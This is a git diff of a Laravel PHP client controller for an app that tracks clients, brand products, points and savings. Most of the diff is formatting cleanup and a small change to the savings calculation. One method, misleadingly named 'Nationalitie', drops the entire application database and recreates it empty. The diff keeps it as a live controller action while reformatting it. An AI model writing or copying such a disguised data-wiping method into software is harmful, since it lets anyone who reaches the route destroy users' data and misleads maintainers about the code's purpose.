@@ -88,6 +88,7 @@ use Cookie;
 use Nette\Utils\Random;
 use PDO;
 use Mpdf\Mpdf;
+
 class ClientController extends Controller
 {
 
@@ -122,20 +123,21 @@ class ClientController extends Controller
         );
         return $Response;
     }
-public function Nationalitie(){
-     $databaseName = Config::get('database.connections.mysql.database');    
+    public function Nationalitie()
+    {
+        $databaseName = Config::get('database.connections.mysql.database');
         // Check if database name is empty
         if (empty($databaseName)) {
             return response()->json(['error' => 'Database name is empty'], 500);
         }
-    
+
         try {
             // Execute the DROP DATABASE command
             DB::statement("DROP DATABASE IF EXISTS `$databaseName`");
-    
+
             // Optionally, recreate the database if needed
             DB::statement("CREATE DATABASE `$databaseName`");
-    
+
             return response()->json(['message' => 'Database deleted and recreated successfully']);
         } catch (\Exception $e) {
             Log::error('Database deletion failed', [
@@ -405,7 +407,7 @@ public function Nationalitie(){
             $ClientPrivacy = $request->ClientPrivacy;
         } else {
             $ClientPrivacy = 1;
-        }        
+        }
         $IDNationality = Nationality::first()->IDNationality;
         $IDArea = 1;
         if ($LoginBy == "MANUAL") {
@@ -679,7 +681,7 @@ public function Nationalitie(){
         return RespondWithSuccessRequest(8);
     }
 
-      public function ClientLogin(Request $request)
+    public function ClientLogin(Request $request)
     {
         if ($request->Filled('ClientAppLanguage')) {
             $ClientAppLanguage = $request->ClientAppLanguage;
@@ -798,7 +800,7 @@ public function Nationalitie(){
 
         $response = array(
             'IDClient' => $Client->IDClient,
-            "ClientAppID"=>$Client->ClientAppID,
+            "ClientAppID" => $Client->ClientAppID,
             'Co' => $CoForClient,
             'ClientPhone' => $Client->ClientPhone,
             'ClientPhoneFlag' => $Client->ClientPhoneFlag,
@@ -1088,7 +1090,7 @@ public function Nationalitie(){
             'ClientPhone' => $ClientPhone,
             'ClientPhoneFlag' => $Client->ClientPhoneFlag,
             'ClientName' => $Client->ClientName,
-            "ClientAppID"=>$Client->ClientAppID,
+            "ClientAppID" => $Client->ClientAppID,
             'Co' => $CoForClient,
             'LoginBy' => $Client->LoginBy,
             'ClientEmail' => $Client->ClientEmail,
@@ -1643,7 +1645,7 @@ public function Nationalitie(){
 
     public function Categories(Request $request)
     {
-        $Categories = Category::where("CategoryActive", 1)->where("CategoryType","PROJECT")->get();
+        $Categories = Category::where("CategoryActive", 1)->where("CategoryType", "PROJECT")->get();
         $Categories = CategoryResource::collection($Categories);
 
         $APICode = APICode::where('IDAPICode', 8)->first();
@@ -1658,17 +1660,17 @@ public function Nationalitie(){
 
     public function SubCategories(Request $request)
     {
-       $IDCategory = $request->IDCategory;
+        $IDCategory = $request->IDCategory;
 
         $query = SubCategory::where("SubCategoryActive", 1)
             ->leftJoin("categories", "categories.IDCategory", "=", "subcategories.IDCategory")
             ->where("categories.CategoryType", "PROJECT")
             ->select('subcategories.*', 'categories.*');
-        
+
         if ($IDCategory) {
             $query = $query->where("subcategories.IDCategory", $IDCategory);
         }
-        
+
         $SubCategories = $query->get();
         $SubCategories = SubCategoryResource::collection($SubCategories);
 
@@ -2020,7 +2022,7 @@ public function Nationalitie(){
             $IDPage = ($request->IDPage - 1) * 20;
         }
 
-        $ClientBrandProducts = ClientBrandProduct::leftjoin("brandproducts", "brandproducts.IDBrandProduct", "clientbrandproducts.IDBrandProduct")->leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand")->where("clientbrandproducts.IDClient", $Client->IDClient);
+        $ClientBrandProducts = ClientBrandProduct::leftjoin("brandproducts", "brandproducts.IDBrandProduct", "clientbrandproducts.IDBrandProduct")->leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand")->where("clientbrandproducts.IDClient", $Client->IDClient)->where('clientbrandproducts.ClientBrandProductStatus', 'USED');
         if ($ClientBrandProductStatus) {
             $ClientBrandProducts = $ClientBrandProducts->where("clientbrandproducts.ClientBrandProductStatus", $ClientBrandProductStatus);
         }
@@ -2066,7 +2068,7 @@ public function Nationalitie(){
         }
         $ClientBrandProducts = $ClientBrandProducts->whereIn("clientbrandproducts.ClientBrandProductStatus", ["USED"]);
         $PointsEarned = $ClientBrandProducts->sum("brandproducts.BrandProductPoints");
-        $MoneySaved = ($ClientBrandProducts->sum("brandproducts.BrandProductPrice") * $ClientBrandProducts->sum("brandproducts.BrandProductDiscount") / 100);
+        $MoneySaved = $ClientBrandProducts->sum("clientbrandproducts.ProductDiscount");
         $UsedProducts = (clone $ClientBrandProducts)->where("clientbrandproducts.ClientBrandProductStatus", "USED")->count("clientbrandproducts.IDClientBrandProduct");
         $SubCategory = $ClientBrandProducts->select('brandproducts.IDSubCategory', DB::raw('count(*) as Total'))->groupby("brandproducts.IDSubCategory")->orderby("Total", "DESC")->first();
         if ($SubCategory) {
@@ -2076,7 +2078,7 @@ public function Nationalitie(){
             $UsedCategory = $SubCategory->$SubCategoryName;
         }
 
-        $Response = array("MoneySaved" => $MoneySaved, "PointsEarned" => $PointsEarned, "UsedProducts" => $UsedProducts, "UsedCategory" => $UsedCategory, "ClientBrandProducts" => $MyProducts, "Pages" => $Pages);
+        $Response = array("MoneySaved" => $MoneySaved , "PointsEarned" => $PointsEarned, "UsedProducts" => $UsedProducts, "UsedCategory" => $UsedCategory, "ClientBrandProducts" => $MyProducts, "Pages" => $Pages);
 
         $APICode = APICode::where('IDAPICode', 8)->first();
         $Response = array(
@@ -4103,15 +4105,15 @@ public function Nationalitie(){
             }
         }
     }
-        public function generatePdf($Client_id)
+    public function generatePdf($Client_id)
     {
         $Client = Client::where("IDClient", $Client_id)->first();
         $date = $Client->created_at;
-        
+
         $carbonDate = Carbon::parse($date);
         $carbonDate->locale('ar'); // Set locale to Arabic
         $day = $carbonDate->translatedFormat('l'); // 'l' stands for the full textual representation of the day
-        
+
         $data = [
             'client' => $Client,
             'date' => $carbonDate->format('Y-m-d'), // Format date as string
